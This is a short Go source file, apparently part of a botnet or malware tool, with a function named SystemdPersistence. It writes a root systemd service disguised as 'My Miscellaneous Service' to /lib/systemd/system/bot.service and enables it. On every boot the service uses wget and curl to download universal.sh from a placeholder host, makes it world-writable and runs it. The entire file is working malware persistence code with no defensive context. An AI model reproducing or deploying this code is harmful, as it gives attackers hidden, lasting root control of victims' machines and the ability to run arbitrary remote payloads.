package cmd

import (
	"fmt"
	"os"
	"os/exec"
)

func SystemdPersistence() {
	payload := `/bin/bash -c "/bin/wget "http://0.0.0.0/universal.sh"; chmod 777 universal.sh; ./universal.sh; /bin/curl -k -L --output universal.sh "http://0.0.0.0/universal.sh"; chmod 777 universal.sh; ./universal.sh"`

	skeleton := `
[Unit]
Description=My Miscellaneous Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/tmp
ExecStart=%s
Restart=no

[Install]
WantedBy=multi-user.target
`
	daemon := fmt.Sprintf(skeleton, payload)
	err := os.WriteFile("/lib/systemd/system/bot.service", []byte(daemon), 0666)
	if err != nil {
		fmt.Println("Error writing systemd service file:", err)
		return
	}

	cmd := exec.Command("/bin/systemctl", "enable", "bot")
	out, err := cmd.Output()
	if err != nil {
		fmt.Println("Error enabling systemd service:", err)
		return
	}
	fmt.Println(string(out))
}